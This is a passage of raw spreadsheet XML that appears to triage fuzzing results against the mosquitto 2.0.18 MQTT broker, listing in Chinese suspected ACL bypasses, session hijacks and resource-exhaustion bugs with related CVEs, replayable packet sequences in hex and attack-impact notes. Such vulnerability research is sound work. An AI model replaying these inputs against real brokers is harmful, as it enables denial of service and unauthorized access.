Topics=['sensor////////M//'(QoS=3)] | raw_header=82160011001173656e736f722f2f2f2f\u000aMsg[13]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f492f2f2f2f2f2f2f2f2f2f\u000aMsg[14]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f04002f2f2f2f2f2f2f2f\u000aMsg[15]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[16]: (不完整,42B) raw=2f2f2f2f2f00007fff2ffafafafafafaeafafafafafa01fbed00fafafafa00fafafafafafa89e821\u000a(尾部42B): 2f2f2f2f2f00007fff2ffafafafafafaeafafafafafa01fbed00fafafafa00fafafafafafa89e8210080</f>
        <v/>
      </c>
      <c r="F7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1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12" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J71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71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713">
      <c r="A713" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B713" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C713" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(316B)\u000a4.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13" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0082 ===\u000a大小: 961B (报告+请求数据)\u000a请求数据: 316B\u000a\u000a---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MQTT请求序列(316B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=27 Topics=[] | raw_header=827f001b2c26000b73656e736f722f74\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=160B | raw_header=31b5010013245359532f62726f6b6572\u000aMsg[3]: PUBACK  | raw_header=4000\u000aMsg[4]: PUBLISH  | raw_header=35</f>
        <v/>
      </c>
      <c r="F7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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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14">
      <c r="A714" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:008a</t>
        </is>
      </c>
      <c r="B714" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C714" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(428B)\u000a4.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0x008a\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E714" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:008a ===\u000a大小: 5383B (报告+请求数据)\u000a请求数据: 428B\u000a\u000a---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$SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(428B原始二进制) ---\u000aMsg[1]: PUBACK PacketID=53663 | raw_header=4453d19f4543540d0a1013006e74732f\u000aMsg[2]: PUBCOMP  | raw_header=7600\u000aMsg[3]: PUBLISH Topic='$share/g}p/test/topic' QoS=0 retain=False payload_len=105B | raw_header=30800100152473686172652f677d702f\u000aMsg[4]: PUBCOMP PacketID=8293 | raw_header=726f2065722f636c69656e74732f636f\u000aMsg[5]: TYPE0  | raw_header=00040b9697ca\u000aMsg[6]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=312664142473686172652f677270322f\u000aMsg[7]: TYPE0  | raw_header=000966757a7a5f70617373\u000aMsg[8]: SUBSCRIBE PacketID=16 Topics=['$SYS/#'(QoS=0)] | raw_header=820b00100006245359532f2300\u000aMsg[9]: (不完整,27B) raw=3222001173656e736f3e8bc12c75ee5e34090000001568656c6c6f\u000a(尾部27B): 3222001173656e736f3e8bc12c75ee5e34090000001568656c6c6f</f>
        <v/>
      </c>
      <c r="F7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1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14" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J71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71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715">
      <c r="A715" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B715" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C715" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(484B)\u000a4.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715" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c0 ===\u000a大小: 987B (报告+请求数据)\u000a请求数据: 484B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(484B原始二进制) ---\u000aMsg[1]: UNSUBACK  | raw_header=b600\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: CONNACK session_present=172 reason_code=4 | raw_header=203bac04002673262626262104262626\u000aMsg[4]: PUBREC PacketID=2740 | raw_header=572f0ab45ac441264027766505ffff05\u000aMsg[5]: TYPE0  | raw_header=0000\u000aMsg[6]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1026260080e7002626262626fe262626\u000aMsg[7]: CONNACK  | raw_header=268000\u000aMsg[8]: TYPE0  | raw_header=0000\u000aMsg[9]: TYPE0  | raw_header=0010263d008000002626262626262626\u000aMsg[10]: CONNACK session_present=101 reason_code=118 | raw_header=2f6c6576656c572f23b4272640277682\u000aMsg[11]: (不完整,195B) raw=05ffff057f262647262226052109262626262613262626262626a62682262673262626261e262626\u000a(尾部195B): 05ffff057f262647262226052109262626262613262626262626a62682262673262626261e26262626262626262626262600</f>
        <v/>
      </c>
      <c r="F7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71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715" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J71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715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16">
      <c r="A716" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:00c2</t>
        </is>
      </c>
      <c r="B716" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C716" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(4698B)\u000a4.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716" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c2 ===\u000a大小: 4822B (报告+请求数据)\u000a请求数据: 4698B\u000a\u000a---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MQTT请求序列(4698B原始二进制) ---\u000aMsg[1]: (不完整,4156B) raw=7aa23183251f0bcbc3ca5e2600142473686172652f677270132f73656e736f722f2300412300097a\u000a(尾部4156B): 7aa23183251f0bcbc3ca5e2600142473686172652f677270132f73656e736f722f2300412300097a2f622f632f642f650c00</f>
        <v/>
      </c>
      <c r="F7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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J71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17">
      <c r="A717" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B717" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C717" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(117B)\u000a4.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717" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0101 ===\u000a大小: 644B (报告+请求数据)\u000a请求数据: 117B\u000a\u000a---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MQTT请求序列(117B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=21759 Topics=[] | raw_header=845b54ff8420ff0061666c21ffff270f\u000aMsg[2]: PINGREQ  | raw_header=c000\u000aMsg[3]: CONNECT  | raw_header=1900\u000aMsg[4]: CONNECT  | raw_header=170126\u000aMsg[5]: TYPE0  | raw_header=000d6d626610007a65725f73796e63\u000aMsg[6]: (不完整,2B) raw=0002\u000a(尾部2B): 0002</f>
        <v/>
      </c>
      <c r="F7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1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17" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J71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17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18">
      <c r="A718" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B718" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C718" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D7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718" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0102 ===\u000a大小: 562B (报告+请求数据)\u000a请求数据: 50B\u000a\u000a---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MQTT请求序列(50B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=68s Will=YES WillTopic='$SYS/broker/version' [自动清理会话] | raw_header=102f00044d515454040e004400000013\u000aMsg[2]: DISCONNECT 断开连接 | raw_header=ed</f>
        <v/>
      </c>
      <c r="F7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71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718" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J71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  <c r="K71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19">
      <c r="A719" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B719" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C719" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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719" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0103 ===\u000a大小: 938B (报告+请求数据)\u000a请求数据: 265B\u000a\u000a---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MQTT请求序列(265B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=045b54ff8420ff0061666c6c6c6c6c6c\u000aMsg[2]: PUBLISH Topic='$SYS/broker/Elients/connected' QoS=3 retain=False payload='\x00\x15$shar' | raw_header=3626001d245359532f62726f6b65722f\u000aMsg[3]: PUBREL PacketID=26403 | raw_header=654a672301740bdd9cd5160300122473\u000aMsg[4]: (不完整,56B) raw=2f74656d70002b766572792f646565702f746f7069822f6c6576656c312f6c6576656c322f6c6576\u000a(尾部56B): 2f74656d70002b766572792f646565702f746f7069822f6c6576656c312f6c6576656c322f6c6576656c332f6c6576656c34</f>
        <v/>
      </c>
      <c r="F7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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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19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0">
      <c r="A720" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B720" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C720" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D7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720" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0181 ===\u000a大小: 714B (报告+请求数据)\u000a请求数据: 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MQTT请求序列(2B原始二进制) ---\u000aMsg[1]: (不完整,2B) raw=31a4\u000a(尾部2B): 31a4</f>
        <v/>
      </c>
      <c r="F7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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J7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20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21">
      <c r="A721" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B721" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C721" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(391B)\u000a4.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721" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0182 ===\u000a大小: 1074B (报告+请求数据)\u000a请求数据: 391B\u000a\u000a---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CVE=CVE-2023-3592)\u000a\u000a--- MQTT请求序列(391B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v5 ClientID=''(0B) clean_session=True keepalive=0s [自动清理会话] | raw_header=105000044d5154540502000000000028\u000aMsg[2]: PUBREL PacketID=25970 | raw_header=6d70657261740010651600061e5b0672\u000aMsg[3]: PUBREL PacketID=25956 | raw_header=6374656400b356013b0900187c486408\u000aMsg[4]: (不完整,77B) raw=dee1287d272065d2201b442d00144de673610d154611bf455b1b67b96e2934090000001568656c6c\u000a(尾部77B): dee1287d272065d2201b442d00144de673610d154611bf455b1b67b96e2934090000001568656c6c6f31220013612f622f63</f>
        <v/>
      </c>
      <c r="F7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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J72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2">
      <c r="A722" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0183</t>
        </is>
      </c>
      <c r="B722" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C722" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(809B)\u000a4.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722" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0183 ===\u000a大小: 1669B (报告+请求数据)\u000a请求数据: 809B\u000a\u000a---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MQTT请求序列(809B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=045b54ff8420ff0061666c6c6c6c6c6c\u000aMsg[2]: PUBLISH Topic='$SYS/^roker/clients/connected' QoS=3 retain=True payload='\x00\x15$shar' | raw_header=3726001d245359532f5e726f6b65722f\u000aMsg[3]: PUBREL PacketID=26482 | raw_header=652f6772702f746573742f746f706963\u000aMsg[4]: TYPE0  | raw_header=01740bdd9cd516030012247368617265\u000aMsg[5]: PUBCOMP PacketID=28016 | raw_header=74656d70000b73656e736f722f74656d\u000aMsg[6]: PUBCOMP PacketID=25344 | raw_header=706963000000395b0012686f6d652f2b\u000aMsg[7]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=152473686172652f6772702f74657374\u000aMsg[8]: TYPE0  | raw_header=000b73656e736f722f74656d70\u000aMsg[9]: TYPE0  | raw_header=000b73656e736f722f74656d70\u000aMsg[10]: PUBCOMP PacketID=55262 | raw_header=7054d7de00501f00122473686172652f\u000aMsg[11]: (不完整,149B) raw=54d7de00501f00122473686172652f677270312f746573742f2b26000b73656e736f722f74656d70\u000a(尾部149B): 54d7de00501f00122473686172652f677270312f746573742f2b26000b73656e736f722f74656d70002b766572792f646565</f>
        <v/>
      </c>
      <c r="F7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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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3">
      <c r="A723" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:01c1</t>
        </is>
      </c>
      <c r="B723" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C723" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(416B)\u000a4.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723" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:01c1 ===\u000a大小: 1134B (报告+请求数据)\u000a请求数据: 416B\u000a\u000a---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MQTT请求序列(416B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=045b54ff8420ff0061666c6c6c6c6c6c\u000aMsg[2]: PUBCOMP PacketID=29797 | raw_header=702f746573742f746f70696300000039\u000aMsg[3]: PUBCOMP PacketID=29807 | raw_header=742f746f706963000000395b0012686f\u000aMsg[4]: PUBREL PacketID=31023 | raw_header=6572792f646565702f746f7069632f6c\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[6]: PUBCOMP  | raw_header=7300\u000aMsg[7]: (不完整,67B) raw=6e736f722f74656d70002b766572792f646565702f746f7069632f6c6576656c312f6c6576656c32\u000a(尾部67B): 6e736f722f74656d70002b766572792f646565702f746f7069632f6c6576656c312f6c6576656c322f6c6576656c332f6c65</f>
        <v/>
      </c>
      <c r="F7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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J72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2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24">
      <c r="A724" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B724" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C724" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(984B)\u000a4.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0x0206\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E724" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0206 ===\u000a大小: 1631B (报告+请求数据)\u000a请求数据: 984B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a【Sev2】MQTT: Duplicate packet identifier (replay/session hijack) (Cat=0x0204 Hash=0xcc642ed8 CVE=N/A)\u000a\u000a--- MQTT请求序列(984B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2579 Topics=['TT\x05Â\x00&lt;(\x11\x00\x00\x0e\x10'(QoS=1)] | raw_header=821b0a13000c545405c2003c28110000\u000aMsg[2]: PUBACK PacketID=294 | raw_header=40170126000d6d626675607a65725f73\u000aMsg[3]: TYPE0  | raw_header=000c66757a7a5f76355f75736572\u000aMsg[4]: TYPE0  | raw_header=000c66757a7a5f76355f70617373\u000aMsg[5]: SUBSCRIBE PacketID=2563 Topics=[] | raw_header=822d0a031a2600152473686172652567\u000aMsg[6]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=128B | raw_header=3a9f01001d245359532f62726f6b6572\u000aMsg[7]: AUTH  | raw_header=ff22000a1900170126000d6d6266757a\u000aMsg[8]: PUBREC PacketID=30074 | raw_header=5f66757a7a000c66757a7a5f76355f75\u000aMsg[9]: PUBCOMP PacketID=12131 | raw_header=74732f636f6e6e656374656400001800\u000aMsg[10]: (不完整,436B) raw=6397361d6f6c98dc9912fe07cd9fb96fbe88e7a70dc7656e736f722f232e0013245359532f62726f\u000a(尾部436B): 6397361d6f6c98dc9912fe07cd9fb96fbe88e7a70dc7656e736f722f232e0013245359532f62726f6b65722f76657273696f</f>
        <v/>
      </c>
      <c r="F7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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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5">
      <c r="A725" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B725" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C725" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(662B)\u000a4.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725" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0286 ===\u000a大小: 1358B (报告+请求数据)\u000a请求数据: 662B\u000a\u000a---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MQTT请求序列(662B原始二进制) ---\u000aMsg[1]: CONNECT  | raw_header=1d0100\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: CONNECT  | raw_header=1000\u000aMsg[4]: SUBSCRIBE PacketID=40741 Topics=[] | raw_header=82319f251f0b7b7b7b7b7b7b7b7b7b7b\u000aMsg[5]: PUBCOMP PacketID=31611 | raw_header=7b7b7b7b7b947b7b7b7b7b7b7b7b7b7b\u000aMsg[6]: PUBREL PacketID=25957 | raw_header=656565656565656565656f6565e50200\u000aMsg[7]: PUBCOMP PacketID=31611 | raw_header=7b7b7b7b7b7b7b7b7b7b7be17b7b7b7b\u000aMsg[8]: PUBREL PacketID=29285 | raw_header=686172652f6772702f746573742f746f\u000aMsg[9]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[10]: (不完整,49B) raw=656565656565656565656565656565000d7365de73de736f722f2b2f7465000d7365de73de736f72\u000a(尾部49B): 656565656565656565656565656565000d7365de73de736f722f2b2f7465000d7365de73de736f722f2b2f74656d81cf00</f>
        <v/>
      </c>
      <c r="F7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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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6">
      <c r="A726" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:028e</t>
        </is>
      </c>
      <c r="B726" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C726" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(914B)\u000a4.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0x028e\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E726" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:028e ===\u000a大小: 6009B (报告+请求数据)\u000a请求数据: 914B\u000a\u000a---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MQTT请求序列(914B原始二进制) ---\u000aMsg[1]: CONNACK session_present=89 reason_code=73 | raw_header=24535949644466757a7a5f7265636f6e\u000aMsg[2]: PUBCOMP PacketID=28016 | raw_header=74656d702f726f6f6d31018212c0c0c0\u000aMsg[3]: PUBCOMP PacketID=28005 | raw_header=74696d6502820b00100006245359532f\u000aMsg[4]: PUBREL PacketID=25965 | raw_header=656c656d643d66757a7a5f7265636f6e\u000aMsg[5]: SUBSCRIBE PacketID=16 Topics=[] | raw_header=820b00100046245359532f2300\u000aMsg[6]: SUBSCRIBE PacketID=17 Topics=['sensor/temp/room1'(QoS=1)] | raw_header=82160011001173656e736f722f74656d\u000aMsg[7]: SUBSCRIBE PacketID=49344 Topics=[] | raw_header=8212c0c0c06c69656e7449643d66757a\u000aMsg[8]: SUBSCRIBE PacketID=17 Topics=['sensor/temp/room1'(QoS=1)] | raw_header=82160011001173656e736f722f74656d\u000aMsg[9]: SUBSCRIBE PacketID=49344 Topics=[] | raw_header=8012c0c0c06c69656e74495420436c69\u000aMsg[10]: PUBREL PacketID=26229 | raw_header=643d66757a7a5f7265636f6e6e65637b\u000aMsg[11]: PUBREC PacketID=12067 | raw_header=59532f230082160011001173656e736f\u000aMsg[12]: PINGREQ  | raw_header=c6480009612f622f632f642f6524002b\u000aMsg[13]: PUBREL PacketID=12075 | raw_header=6d652f2b2f74656d7065726174757265\u000aMsg[14]: TYPE0  | raw_header=00146465766963652f2b2f74656c656d\u000aMsg[15]: (不完整,61B) raw=5f7265636f6e6e65637b20436c65616e53657373696f6e3d2f2b2f73746174757302301600146465\u000a(尾部61B): 5f7265636f6e6e65637b20436c65616e53657373696f6e3d2f2b2f73746174757302301600146465806963652f2b2f74656c</f>
        <v/>
      </c>
      <c r="F7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2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26" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J72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  <c r="K72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【漏洞可靠性高】AFLNet fuzzing框架已多次重放验证该漏洞的稳定性（标记为replayable），表明攻击者可在真实环境中稳定复现该漏洞，利用成功率较高。</t>
        </is>
      </c>
    </row>
    <row r="727">
      <c r="A727" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B727" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C727" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(1013B)\u000a4.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0x02c4\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E727" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c4 ===\u000a大小: 5236B (报告+请求数据)\u000a请求数据: 1013B\u000a\u000a---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MQTT请求序列(1013B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31650080001716176172652f67727032\u000aMsg[2]: CONNECT  | raw_header=1900\u000aMsg[3]: CONNECT  | raw_header=170126\u000aMsg[4]: TYPE0  | raw_header=010d6d62ffffff7fae636469656e81\u000aMsg[5]: PUBCOMP PacketID=8047 | raw_header=732f1f6f686e65637465190a0444020a\u000aMsg[6]: PUBACK PacketID=18247 | raw_header=47474747474747474747474747474747\u000aMsg[7]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373537\u000aMsg[8]: UNSUBACK  | raw_header=b64d11185e161742f83940b080007482\u000aMsg[9]: PUBACK PacketID=18247 | raw_header=47474747474747474747474747474747\u000aMsg[10]: PUBREL PacketID=25956 | raw_header=637465640a0444020a2ad54747474747\u000aMsg[11]: CONNACK  | raw_header=2600\u000aMsg[12]: SUBSCRIBE PacketID=1991 Topics=[] | raw_header=823507c7050b9da18229001424736861\u000aMsg[13]: PUBLISH Topic='senso\x95/temp' QoS=2 retain=False payload_len=174B | raw_header=3cbb01000b73656e736f952f74656d70\u000aMsg[14]: CONNACK  | raw_header=2300\u000aMsg[15]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=142473686172652f677270322f73656e\u000aMsg[16]: PUBCOMP PacketID=29797 | raw_header=702f746573742f746f706963008c3923\u000aMsg[17]: TYPE0  | raw_header=0000\u000aMsg[18]: TYPE0  | raw_header=0013245359532f62726f6b65722f7665\u000aMsg[19]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30376b6c6409d584bf693fa15fe10a02\u000aMsg[20]: TYPE0  | raw_header=0100\u000aMsg[21]: PINGRESP  | raw_header=d913cced56b9b5923fe5e8d89b25e9b4\u000aMsg[22]: (不完整,2B) raw=0506\u000a(尾部2B): 0506</f>
        <v/>
      </c>
      <c r="F7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72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727" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J72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  <c r="K727" s="9" t="inlineStr">
        <is>
          <t>【内存耗尽型拒绝服务】攻击者可向Mosquitto发送特制的超长协议字段或大量并发请求，导致服务器内存分配持续增长直至OOM(Out of Memory)。操作系统OOM Killer将强制终止Mosquitto进程，造成服务完全中断。在容器化部署环境中，可能触发Pod/容器重启，影响同节点其他服务。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28">
      <c r="A728" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:02c6</t>
        </is>
      </c>
      <c r="B728" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C728" s="2" t="inlineStr">
        <is>
